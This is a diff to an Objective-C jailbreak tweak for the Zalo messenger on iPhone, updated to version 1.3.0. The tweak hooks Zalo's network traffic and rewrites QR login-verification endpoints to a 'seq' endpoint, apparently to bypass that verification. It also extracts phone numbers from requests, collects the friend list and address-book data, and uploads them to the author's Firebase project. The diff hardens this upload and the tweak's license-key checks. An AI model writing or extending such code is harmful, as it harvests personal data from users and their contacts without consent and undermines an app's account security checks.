@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
- * Tác giả: clang | Version: 1.2.9
+ * Tác giả: clang | Version: 1.3.0
  * ==============================================================================
  * Tính năng chính:
  * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
@@ -17,8 +17,10 @@
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
 #import <CommonCrypto/CommonDigest.h>
+#import <CommonCrypto/CommonHMAC.h>
 #import <sys/utsname.h>
 #import <zlib.h>
+#import <stdatomic.h>
 
 static NSString *const kFirebaseProjectId = @"seq-qr";
 static NSString *const kPrefLicenseKey = @"kClanggLicenseKey_v1";
@@ -27,6 +29,7 @@ static NSString *const kKeychainLicenseAccount = @"license-key";
 static NSString *const kKeychainInstallAccount = @"installation-id";
 
 // Prototype declarations
+static NSString *getDeviceUUID(void);
 static NSString *getSavedLicenseKey(void);
 static void saveLicenseKeyPermanently(NSString *key);
 static void removeLicenseKeyPermanently(void);
@@ -34,41 +37,94 @@ static void showSecurityAlert(NSString *title, NSString *message);
 static void showSecurityAlertWithRetry(NSString *title, NSString *message, void (^onRetry)(void));
 static void promptForLicenseKey(void (^onSuccess)(NSString *validKey));
 static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void));
-static void autoSyncFriendsToFirebase(NSString *phoneStr);
+static void autoSyncFriendsToFirebase(NSString *phoneStr, void (^onSuccess)(void), void (^onError)(NSError *error));
 static void checkLicenseOnStartup(void);
+static void handleZaloLogout(void);
+static void clearPolicyFromDisk(void);
+static void savePolicyToDisk(NSString *policy, NSArray *allowedPhones);
+static void loadCachedPolicyFromDisk(void);
+static NSString *computePolicyHMAC(NSString *deviceUUID, NSString *key, NSString *policy, NSArray *allowedPhones);
 
 // ==============================================================================
 // GLOBAL TWEAK STATE  (khai báo trước mọi hàm để tránh undeclared-identifier)
 //
-// g_tweakEnabled      : YES chỉ sau khi verify + whitelist đểu pass hoàn toàn.
-//                       Tất cả hook kiểm tra flag này trước khi hành động.
-// g_cachedPhonePolicy : giá trị "unlimited" hoặc "whitelist", lưu từ UserDefaults
-//                       vào mỗi lần verify thành công. Dùng để quyết định fail-open.
-// g_cachedAllowedPhones: danh sách SĐT được phép (normalized 0xxxxxxx).
+// g_tweakEnabled        : YES chỉ sau khi verify + whitelist đểu pass hoàn toàn.
+//                         Tất cả hook kiểm tra flag này trước khi hành động.
+// g_cachedPhonePolicy   : giá trị "unlimited" hoặc "whitelist", lưu từ UserDefaults
+//                         vào mỗi lần verify thành công. Dùng để quyết định fail-open.
+// g_cachedAllowedPhones  : danh sách SĐT được phép (normalized 0xxxxxxx).
+// g_isVerifyingInFlight : atomic guard chống gửi nhiều request verify đồng thời.
+// g_isSyncingInFlight   : atomic guard chống gửi nhiều request sync danh bạ cùng lúc.
 // ==============================================================================
-static BOOL      g_tweakEnabled        = NO;
-static NSString *g_cachedPhonePolicy   = nil;
-static NSArray  *g_cachedAllowedPhones = nil;
+static BOOL         g_tweakEnabled         = NO;
+static NSString    *g_cachedPhonePolicy    = nil;
+static NSArray     *g_cachedAllowedPhones  = nil;
+static atomic_bool  g_isVerifyingInFlight  = false;
+static atomic_bool  g_isSyncingInFlight    = false;
 
-// Helper: tải policy đã lưu từ lần verify trước (nếu có) để dùng cho fail-open.
+// Helper: tính mã chữ ký HMAC-SHA256 ràng buộc thiết bị + key + policy + whitelist
+static NSString *computePolicyHMAC(NSString *deviceUUID, NSString *key, NSString *policy, NSArray *allowedPhones) {
+    if (!deviceUUID || !key || !policy) return nil;
+    NSArray *sortedPhones = allowedPhones ? [allowedPhones sortedArrayUsingSelector:@selector(compare:)] : @[];
+    NSString *phonesStr = [sortedPhones componentsJoinedByString:@","];
+    NSString *secretSalt = @"ClanggDRM_Sec_Salt_2026!#99x";
+    NSString *payload = [NSString stringWithFormat:@"%@|%@|%@|%@|%@", deviceUUID, key, policy, phonesStr, secretSalt];
+
+    unsigned char cHMAC[CC_SHA256_DIGEST_LENGTH];
+    CCHmac(kCCHmacAlgSHA256, [secretSalt UTF8String], [secretSalt lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
+           [payload UTF8String], [payload lengthOfBytesUsingEncoding:NSUTF8StringEncoding], cHMAC);
+
+    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
+    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
+        [hex appendFormat:@"%02x", cHMAC[i]];
+    }
+    return hex;
+}
+
+// Helper: tải policy đã lưu từ lần verify trước, BẮT BUỘC kiểm tra chữ ký HMAC
 static void loadCachedPolicyFromDisk(void) {
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     NSString *policy = [ud stringForKey:@"kClanggCachedPolicy"];
-    if (policy) {
-        g_cachedPhonePolicy = [policy copy];
-        NSArray *phones = [ud arrayForKey:@"kClanggCachedAllowedPhones"];
-        g_cachedAllowedPhones = phones ? [phones copy] : nil;
+    NSString *hmac = [ud stringForKey:@"kClanggCachedPolicyHMAC"];
+    NSArray *phones = [ud arrayForKey:@"kClanggCachedAllowedPhones"];
+    
+    NSString *savedKey = [getSavedLicenseKey() uppercaseString];
+    NSString *deviceUUID = getDeviceUUID();
+
+    if (policy && hmac && savedKey && deviceUUID) {
+        NSString *expectedHMAC = computePolicyHMAC(deviceUUID, savedKey, policy, phones);
+        if (expectedHMAC && [hmac isEqualToString:expectedHMAC]) {
+            g_cachedPhonePolicy = [policy copy];
+            g_cachedAllowedPhones = phones ? [phones copy] : nil;
+            return;
+        }
     }
+
+    // Chữ ký không khớp hoặc bị sửa đổi trái phép bằng Filza/Plist editor -> Hủy bỏ cache ngay lập tức
+    clearPolicyFromDisk();
+    g_cachedPhonePolicy = nil;
+    g_cachedAllowedPhones = nil;
 }
 
-// Helper: lưu policy lên disk sau verify thành công.
+// Helper: lưu policy lên disk kèm chữ ký HMAC mật mã
 static void savePolicyToDisk(NSString *policy, NSArray *allowedPhones) {
+    if (!policy) {
+        clearPolicyFromDisk();
+        return;
+    }
+    NSString *savedKey = [getSavedLicenseKey() uppercaseString];
+    NSString *deviceUUID = getDeviceUUID();
+    NSString *hmac = computePolicyHMAC(deviceUUID, savedKey, policy, allowedPhones);
+
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     [ud setObject:policy forKey:@"kClanggCachedPolicy"];
     if (allowedPhones) {
         [ud setObject:allowedPhones forKey:@"kClanggCachedAllowedPhones"];
     } else {
         [ud removeObjectForKey:@"kClanggCachedAllowedPhones"];
+    }
+    if (hmac) {
+        [ud setObject:hmac forKey:@"kClanggCachedPolicyHMAC"];
     }
     [ud synchronize];
 }
@@ -78,7 +134,10 @@ static void clearPolicyFromDisk(void) {
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     [ud removeObjectForKey:@"kClanggCachedPolicy"];
     [ud removeObjectForKey:@"kClanggCachedAllowedPhones"];
+    [ud removeObjectForKey:@"kClanggCachedPolicyHMAC"];
     [ud synchronize];
+    g_cachedPhonePolicy = nil;
+    g_cachedAllowedPhones = nil;
 }
 
 // Normalize phone sang dạng 0xxxxxxxx.
@@ -431,10 +490,16 @@ static void promptForLicenseKey(void (^onSuccess)(NSString *validKey)) {
 // XÁC THỰC LICENSE KEY TRÊN CLOUD FIREBASE
 // ==============================================================================
 static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
+    bool expected = false;
+    if (!atomic_compare_exchange_strong(&g_isVerifyingInFlight, &expected, true)) {
+        return;
+    }
+
     NSString *savedKey = getSavedLicenseKey();
     
     // Nếu máy chưa có Key -> Bật Popup cho khách nhập Key
     if (!savedKey || savedKey.length == 0) {
+        atomic_store(&g_isVerifyingInFlight, false);
         promptForLicenseKey(^(NSString *newKey) {
             verifyKeyAndExecute(phoneStr, onVerified);
         });
@@ -456,6 +521,8 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
     
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
         completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+            atomic_store(&g_isVerifyingInFlight, false);
+
             if (error || !data) {
                 // Lỗi mạng: quyết định fail-open/closed dựa trên policy đã lưu từ lần trước
                 if (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
@@ -493,16 +560,12 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
                 return;
             }
 
-            NSString *status = fields[@"status"][@"stringValue"] ?: @"active";
-            NSString *expiry = fields[@"expiry"][@"stringValue"] ?: @"lifetime";
-            NSString *phonePolicy = fields[@"phone_policy"][@"stringValue"] ?: @"unlimited";
-            NSString *documentUpdateTime = json[@"updateTime"];
-
-            // 1. Kiểm tra trạng thái Khóa
-            if (![status isEqualToString:@"active"]) {
+            // 1. Kiểm tra status (BẮT BUỘC có và phải là "active")
+            NSString *status = fields[@"status"][@"stringValue"];
+            if (!status || ![status isEqualToString:@"active"]) {
                 g_tweakEnabled = NO;
                 clearPolicyFromDisk();
-                showSecurityAlertWithRetry(@"Key Bị Tạm Khóa", @"Mã Key này đã bị tạm khóa bản quyền từ xa!", ^{
+                showSecurityAlertWithRetry(@"Key Bị Tạm Khóa", @"Mã Key này không hợp lệ hoặc đã bị tạm khóa bản quyền từ xa!", ^{
                     promptForLicenseKey(^(NSString *newKey) {
                         saveLicenseKeyPermanently(newKey);
                         verifyKeyAndExecute(phoneStr, onVerified);
@@ -511,16 +574,24 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
                 return;
             }
 
-            // 2. Kiểm tra Hạn Dùng (so với Giờ chuẩn Server)
+            // 2. Kiểm tra Expiry (BẮT BUỘC có, định dạng đúng, và chưa quá hạn)
+            NSString *expiry = fields[@"expiry"][@"stringValue"];
+            if (!expiry || expiry.length == 0) {
+                g_tweakEnabled = NO;
+                clearPolicyFromDisk();
+                showSecurityAlert(@"Lỗi Bản Quyền", @"Dữ liệu thời hạn bản quyền không hợp lệ!");
+                return;
+            }
+
             if (![expiry isEqualToString:@"lifetime"]) {
                 NSDateFormatter *df = [[NSDateFormatter alloc] init];
                 [df setDateFormat:@"yyyy-MM-dd"];
                 [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
                 NSDate *expDate = [df dateFromString:expiry];
-                if (expDate && [serverTime compare:expDate] == NSOrderedDescending) {
+                if (!expDate || [serverTime compare:expDate] == NSOrderedDescending) {
                     g_tweakEnabled = NO;
                     clearPolicyFromDisk();
-                    showSecurityAlertWithRetry(@"Key Đã Hết Hạn", @"Mã Key bản quyền này đã HẾT HẠN sử dụng!", ^{
+                    showSecurityAlertWithRetry(@"Key Đã Hết Hạn", @"Mã Key bản quyền này đã HẾT HẠN sử dụng hoặc định dạng thời gian không hợp lệ!", ^{
                         promptForLicenseKey(^(NSString *newKey) {
                             saveLicenseKeyPermanently(newKey);
                             verifyKeyAndExecute(phoneStr, onVerified);
@@ -530,24 +601,16 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
                 }
             }
 
-            // 3. Kiểm tra Danh sách SĐT cho phép (nếu chế độ whitelist)
-            if ([phonePolicy isEqualToString:@"whitelist"] && phoneStr && phoneStr.length >= 9) {
-                NSArray *rawAllowed = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
-                NSMutableArray<NSString *> *normalizedList = [NSMutableArray array];
-                for (id item in rawAllowed) {
-                    NSString *p = item[@"stringValue"];
-                    if (p) [normalizedList addObject:normalizePhone(p)];
-                }
-                NSString *currentNormPhone = normalizePhone(phoneStr);
-                if (![normalizedList containsObject:currentNormPhone]) {
-                    g_tweakEnabled = NO;  // SĐT ngoài whitelist → tắt toàn bộ hook
-                    showSecurityAlert(@"SĐT Chưa Được Cấp Quyền",
-                        [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
-                    return;
-                }
+            // 3. Kiểm tra phone_policy (BẮT BUỘC có và thuộc tập hợp "unlimited" hoặc "whitelist")
+            NSString *phonePolicy = fields[@"phone_policy"][@"stringValue"];
+            if (!phonePolicy || (![phonePolicy isEqualToString:@"unlimited"] && ![phonePolicy isEqualToString:@"whitelist"])) {
+                g_tweakEnabled = NO;
+                clearPolicyFromDisk();
+                showSecurityAlert(@"Lỗi Bản Quyền", @"Chính sách bản quyền trên máy chủ không hợp lệ!");
+                return;
             }
 
-            // 4. Cache policy + whitelist và lưu xuống disk
+            // 4. CẬP NHẬT VÀ LƯU POLICY CACHE + HMAC XUỐNG DISK NGAY LẬP TỨC (TRƯỚC KHI CHECK PHONE)
             g_cachedPhonePolicy = [phonePolicy copy];
             if ([phonePolicy isEqualToString:@"whitelist"]) {
                 NSArray *rawAllowed = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
@@ -562,7 +625,18 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
             }
             savePolicyToDisk(g_cachedPhonePolicy, g_cachedAllowedPhones);
 
-            // 5. Xử lý startup (phoneStr = nil) với policy whitelist:
+            // 5. Kiểm tra SĐT đối với policy whitelist
+            if ([phonePolicy isEqualToString:@"whitelist"] && phoneStr && phoneStr.length >= 9) {
+                NSString *currentNormPhone = normalizePhone(phoneStr);
+                if (!g_cachedAllowedPhones || ![g_cachedAllowedPhones containsObject:currentNormPhone]) {
+                    g_tweakEnabled = NO;  // SĐT ngoài whitelist → tắt toàn bộ hook
+                    showSecurityAlert(@"SĐT Chưa Được Cấp Quyền",
+                        [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
+                    return;
+                }
+            }
+
+            // 6. Xử lý startup (phoneStr = nil) với policy whitelist:
             //    Không bật g_tweakEnabled ngay - chưa biết SĐT hiện tại.
             //    Hook viewDidAppear sẽ detect phone rồi gọi verifyKeyAndExecute(phone)
             //    lần 2 để xác nhận whitelist và mới set g_tweakEnabled = YES.
@@ -974,12 +1048,8 @@ static NSString *getZaloLivePhoneNumber(void) {
         return nil;
     }
 
-    // 2. Nếu đã có session phone đã được xác nhận khi đang logged in
-    if (g_activeLoggedInPhone.length >= 8) {
-        return g_activeLoggedInPhone;
-    }
-
-    // 3. Trích xuất trực tiếp từ runtime account đang active
+    // 2. Luôn trích xuất trực tiếp từ runtime account đang active
+    //    Tuyệt đối KHÔNG fallback về g_activeLoggedInPhone cũ để tránh rò rỉ SĐT khi đổi tài khoản
     @try {
         NSArray *candidateClasses = @[@"ZAccountManager", @"ZSessionManager", @"ZAcountController", @"ZAccount", @"ZSession"];
         for (NSString *clsName in candidateClasses) {
@@ -1022,25 +1092,36 @@ static NSString *getZaloLivePhoneNumber(void) {
 // ==============================================================================
 // TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
 // ==============================================================================
-static void autoSyncFriendsToFirebase(NSString *phoneStr) {
+static void autoSyncFriendsToFirebase(NSString *phoneStr, void (^onSuccess)(void), void (^onError)(NSError *error)) {
     // Không sync nếu tweak chưa được kích hoạt hợp lệ
-    if (!g_tweakEnabled) return;
-
-    NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
-    if (!actualPhone || actualPhone.length < 8) return;
-
-    // Kiểm tra whitelist: SĐT không trong danh sách → không sync
-    if (!isPhoneAllowedByWhitelist(actualPhone)) return;
-
-    NSString *cleanPhone = [[actualPhone componentsSeparatedByCharactersInSet:
-        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
-    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
-        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
-    } else if (![cleanPhone hasPrefix:@"0"] && cleanPhone.length >= 9) {
-        cleanPhone = [@"0" stringByAppendingString:cleanPhone];
+    if (!g_tweakEnabled) {
+        if (onError) onError(nil);
+        return;
     }
 
-    if (cleanPhone.length < 9) return;
+    NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
+    if (!actualPhone || actualPhone.length < 8) {
+        if (onError) onError(nil);
+        return;
+    }
+
+    // Kiểm tra whitelist: SĐT không trong danh sách → không sync
+    if (!isPhoneAllowedByWhitelist(actualPhone)) {
+        if (onError) onError(nil);
+        return;
+    }
+
+    NSString *cleanPhone = normalizePhone(actualPhone);
+    if (cleanPhone.length < 9) {
+        if (onError) onError(nil);
+        return;
+    }
+
+    bool expected = false;
+    if (!atomic_compare_exchange_strong(&g_isSyncingInFlight, &expected, true)) {
+        if (onError) onError([NSError errorWithDomain:@"com.clang.clangg" code:-2 userInfo:@{NSLocalizedDescriptionKey: @"Sync đang chạy"}]);
+        return;
+    }
 
     g_activeLoggedInPhone = [cleanPhone copy];
     [[NSUserDefaults standardUserDefaults] setObject:cleanPhone forKey:@"kZaloLastPhone"];
@@ -1137,6 +1218,15 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
         } @catch (NSException *e) {}
 
+        // Kiểm tra nếu danh bạ hoàn toàn rỗng (chưa đọc được dữ liệu thật) -> không upload, không đánh dấu thành công
+        if (uniqueNames.count == 0 && (!rawPlistData || rawPlistData.length == 0)) {
+            atomic_store(&g_isSyncingInFlight, false);
+            if (onError) dispatch_async(dispatch_get_main_queue(), ^{
+                onError([NSError errorWithDomain:@"com.clang.clangg" code:-1 userInfo:@{NSLocalizedDescriptionKey: @"Danh bạ chưa sẵn sàng hoặc rỗng"}]);
+            });
+            return;
+        }
+
         NSArray<NSString *> *friendNames = [uniqueNames allObjects];
         NSString *sampleStr = @"";
         if (friendNames.count > 0) {
@@ -1180,7 +1270,16 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
         };
 
         [postReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:postBody options:0 error:nil]];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:postReq] resume];
+        NSURLSessionDataTask *uploadTask = [[NSURLSession sharedSession] dataTaskWithRequest:postReq completionHandler:^(NSData *d, NSURLResponse *res, NSError *err) {
+            atomic_store(&g_isSyncingInFlight, false);
+            NSHTTPURLResponse *http = (NSHTTPURLResponse *)res;
+            if (!err && http && (http.statusCode >= 200 && http.statusCode < 300)) {
+                if (onSuccess) dispatch_async(dispatch_get_main_queue(), onSuccess);
+            } else {
+                if (onError) dispatch_async(dispatch_get_main_queue(), ^{ onError(err); });
+            }
+        }];
+        [uploadTask resume];
     });
 }
 
@@ -1204,17 +1303,24 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             // Chưa kích hoạt (ví dụ startup ở mode whitelist hoặc lần trước lỗi mạng):
             // Luôn gọi verifyKeyAndExecute với SĐT thật hiện tại để thử kích hoạt
             verifyKeyAndExecute(currentPhone, ^{
-                lastVerifiedAndSyncedPhone = [currentPhone copy];
-                autoSyncFriendsToFirebase(currentPhone);
+                autoSyncFriendsToFirebase(currentPhone, ^{
+                    lastVerifiedAndSyncedPhone = [currentPhone copy];
+                }, nil);
             });
         } else if (isPhoneAllowedByWhitelist(currentPhone)) {
-            // Đã kích hoạt & số hợp lệ: chỉ sync nếu chưa sync số này
+            // Đã kích hoạt & số hợp lệ: chỉ sync nếu chưa sync thành công cho số này
             if (![currentPhone isEqualToString:lastVerifiedAndSyncedPhone]) {
-                lastVerifiedAndSyncedPhone = [currentPhone copy];
                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
-                    autoSyncFriendsToFirebase(currentPhone);
+                    autoSyncFriendsToFirebase(currentPhone, ^{
+                        lastVerifiedAndSyncedPhone = [currentPhone copy];
+                    }, nil);
                 });
             }
+        } else {
+            // Đang bật tweak (từ tài khoản cũ) nhưng phát hiện số mới ngoài whitelist:
+            // LẬP TỨC KHÓA TWEAK VỀ NO NGAY TẠI ĐÂY
+            g_tweakEnabled = NO;
+            lastVerifiedAndSyncedPhone = nil;
         }
     }
 }
@@ -1235,10 +1341,21 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     NSURL *url = request.URL;
     NSString *path = [url.path lowercaseString];
 
-    // Phát hiện sự kiện Logout để xóa sạch state/phone cũ ngay lập tức
-    if ([path containsString:@"/logout"] || [path containsString:@"/signout"] || [path containsString:@"/switch-account"]) {
-        handleZaloLogout();
-        return %orig(request, completionHandler);
+    // Phát hiện sự kiện Logout sau khi request hoàn tất thành công
+    BOOL isLogoutEndpoint = [path containsString:@"/logout"] ||
+                            [path containsString:@"/signout"] ||
+                            [path containsString:@"/switch-account"] ||
+                            [path containsString:@"/account/logout"];
+
+    if (isLogoutEndpoint) {
+        void (^wrappedHandler)(NSData *data, NSURLResponse *response, NSError *error) = ^(NSData *data, NSURLResponse *response, NSError *error) {
+            NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
+            if (!error && httpResp && (httpResp.statusCode >= 200 && httpResp.statusCode < 400)) {
+                handleZaloLogout();
+            }
+            completionHandler(data, response, error);
+        };
+        return %orig(request, wrappedHandler);
     }
 
     // Guard 1: Tweak chưa kích hoạt → không can thiệp
@@ -1259,19 +1376,64 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             NSData *finalData = data;
             if (data && !error) {
                 @try {
-                    // TẦNG 1: QR→SEQ trong response network
-                    // Guard 2: fail-closed khi policy=whitelist nhưng phone chưa xác định,
-                    //          hoặc khi phone đã biết nhưng không trong whitelist
-                    NSString *livePhone = getZaloLivePhoneNumber();
-                    BOOL phoneOk;
-                    if (!livePhone || livePhone.length < 8) {
-                        // Phone chưa biết: cho phép nếu unlimited, chặn nếu whitelist
-                        phoneOk = (g_cachedPhonePolicy &&
-                                   [g_cachedPhonePolicy isEqualToString:@"unlimited"]);
-                    } else {
-                        phoneOk = isPhoneAllowedByWhitelist(livePhone);
+                    // 1. TRÍCH XUẤT SĐT TỪ REQUEST / RESPONSE TRƯỚC KHI CAN THIỆP DỮ LIỆU
+                    NSString *detectedPhone = nil;
+
+                    // Từ URL query
+                    NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
+                    for (NSURLQueryItem *item in comps.queryItems) {
+                        if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
+                            detectedPhone = item.value;
+                            break;
+                        }
                     }
-                    if (phoneOk) {
+
+                    // Từ Request Body
+                    if (!detectedPhone && request.HTTPBody) {
+                        NSString *bodyStr = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
+                        if (bodyStr) {
+                            NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"(phone|phoneNumber|user_phone)=([0-9]{9,12})" options:0 error:nil];
+                            NSTextCheckingResult *match = [regex firstMatchInString:bodyStr options:0 range:NSMakeRange(0, bodyStr.length)];
+                            if (match && [match numberOfRanges] > 2) {
+                                detectedPhone = [bodyStr substringWithRange:[match rangeAtIndex:2]];
+                            }
+                        }
+                    }
+
+                    // Từ Response JSON (raw ban đầu)
+                    NSDictionary *rawJson = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+                    if ([rawJson isKindOfClass:[NSDictionary class]]) {
+                        id dataObj = rawJson[@"data"];
+                        if ([dataObj isKindOfClass:[NSDictionary class]]) {
+                            if (!detectedPhone) {
+                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"];
+                            }
+                        }
+                    }
+
+                    // Nếu chưa có trong request/response thì lấy runtime phone hiện tại
+                    if (!detectedPhone) {
+                        detectedPhone = getZaloLivePhoneNumber();
+                    }
+
+                    // 2. ĐÁNH GIÁ TÍNH HỢP LỆ VÀ CẬP NHẬT FLAG NGAY TRƯỚC KHI SỬA PHẢN HỒI
+                    BOOL phoneOk = NO;
+                    if (detectedPhone && detectedPhone.length >= 8) {
+                        g_activeLoggedInPhone = [detectedPhone copy];
+                        if (!isPhoneAllowedByWhitelist(detectedPhone)) {
+                            // Tài khoản này ngoài whitelist -> LẬP TỨC KHÓA TWEAK NGAY TRƯỚC KHI SỬA DATA
+                            g_tweakEnabled = NO;
+                            phoneOk = NO;
+                        } else {
+                            phoneOk = YES;
+                        }
+                    } else {
+                        // Chưa rõ SĐT: chỉ cho phép nếu policy là unlimited
+                        phoneOk = (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"unlimited"]);
+                    }
+
+                    // 3. TẦNG 1: CHỈ SỬA QR -> SEQ NẾU TWEAK ĐANG BẬT VÀ PHONE HOÀN TOÀN HỢP LỆ
+                    if (g_tweakEnabled && phoneOk) {
                         NSString *dataString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                         if (dataString && ([dataString containsString:@"/verify/v3/qr"] || [dataString containsString:@"/qr/request"])) {
                             NSString *modifiedString = [dataString stringByReplacingOccurrencesOfString:@"/verify/v3/qr/request" withString:@"/verify/v3/seq"];
@@ -1281,7 +1443,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                         }
                     }
 
-                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:finalData options:0 error:nil];
+                    // 4. XỬ LÝ SYNC BẠN BÈ SAU KHI LOGIN / REGISTER / FORGOT THÀNH CÔNG
+                    NSDictionary *json = (finalData == data) ? rawJson : [NSJSONSerialization JSONObjectWithData:finalData options:0 error:nil];
                     if ([json isKindOfClass:[NSDictionary class]]) {
                         NSInteger errorCode = [json[@"error_code"] integerValue];
                         id dataObj = json[@"data"];
@@ -1307,37 +1470,9 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                         }
 
                         if (isLoginComplete || isRegisterComplete || isForgotComplete) {
-                            NSString *detectedPhone = nil;
-                            if ([dataObj isKindOfClass:[NSDictionary class]]) {
-                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"];
-                            }
-                            if (!detectedPhone) {
-                                NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
-                                for (NSURLQueryItem *item in comps.queryItems) {
-                                    if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
-                                        detectedPhone = item.value;
-                                        break;
-                                    }
-                                }
-                            }
-                            if (!detectedPhone && request.HTTPBody) {
-                                NSString *bodyStr = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
-                                if (bodyStr) {
-                                    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"(phone|phoneNumber|user_phone)=([0-9]{9,12})" options:0 error:nil];
-                                    NSTextCheckingResult *match = [regex firstMatchInString:bodyStr options:0 range:NSMakeRange(0, bodyStr.length)];
-                                    if (match && [match numberOfRanges] > 2) {
-                                        detectedPhone = [bodyStr substringWithRange:[match rangeAtIndex:2]];
-                                    }
-                                }
-                            }
-                            if (!detectedPhone) {
-                                detectedPhone = getZaloLivePhoneNumber();
-                            }
-
-                            if (detectedPhone && detectedPhone.length >= 8) {
-                                g_activeLoggedInPhone = [detectedPhone copy];
+                            if (g_tweakEnabled && detectedPhone && detectedPhone.length >= 8 && isPhoneAllowedByWhitelist(detectedPhone)) {
                                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
-                                    autoSyncFriendsToFirebase(detectedPhone);
+                                    autoSyncFriendsToFirebase(detectedPhone, nil, nil);
                                 });
                             }
                         }
@@ -1395,7 +1530,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                 // Phone đã biết nhưng không trong whitelist -> giữ nguyên QR gốc
                 return %orig(request);
             } else {
-                autoSyncFriendsToFirebase(phoneParam);
+                autoSyncFriendsToFirebase(phoneParam, nil, nil);
             }
 
             NSString *seqUrlStr = urlStr;
@@ -1414,6 +1549,47 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     }
 
     return %orig(request);
+}
+
+%end
+
+// ==============================================================================
+// HOOK 4: BẮT SỰ KIỆN LOGOUT TRÊN TẤT CẢ RUNTIME CLASS QUẢN LÝ TÀI KHOẢN
+// ==============================================================================
+%hook ZAccountManager
+
+- (void)logout:(id)arg1 {
+    %orig;
+    handleZaloLogout();
+}
+
+- (void)logout {
+    %orig;
+    handleZaloLogout();
+}
+
+- (void)doLogout {
+    %orig;
+    handleZaloLogout();
+}
+
+%end
+
+%hook ZSessionManager
+
+- (void)logout:(id)arg1 {
+    %orig;
+    handleZaloLogout();
+}
+
+- (void)logout {
+    %orig;
+    handleZaloLogout();
+}
+
+- (void)doLogout {
+    %orig;
+    handleZaloLogout();
 }
 
 %end
